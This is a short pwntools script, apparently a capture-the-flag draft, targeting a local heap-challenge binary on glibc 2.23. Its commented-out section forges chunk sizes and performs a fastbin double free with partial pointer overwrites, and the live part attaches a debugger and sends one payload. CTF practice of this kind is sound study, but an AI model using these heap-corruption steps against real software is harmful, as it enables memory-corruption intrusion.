from pwn import*
context.log_level  = 'DEBUG'
def menu(ch):
	p.sendlineafter('choice:',str(ch))
def new(size,content):
	menu(1)
	p.sendlineafter('how long?',str(size))
	p.send(content)
def free(index):
	menu(3)
	p.sendlineafter('which one?',str(index))
def gift(content):
	menu(2)
	p.send(content)
p = process('./main')
libc = ELF('./libc-2.23.so')
'''
new(0x10,p64(0) + p64(0x71))
new(0x60,p64(0)*5 + p64(0xD1))
new(0x60,'FMYY')
free(1)
free(2)
free(1)
new(0x60,'\x30')
new(0x60,'FMYY')
new(0x60,'FMYY')
new(0x60,p64(0) + p64(0x21) + p64(0) + '\xA0')
free(1)
free(2)
'''
gdb.attach(p)
gift(p64(0)*2)
p.interactive()
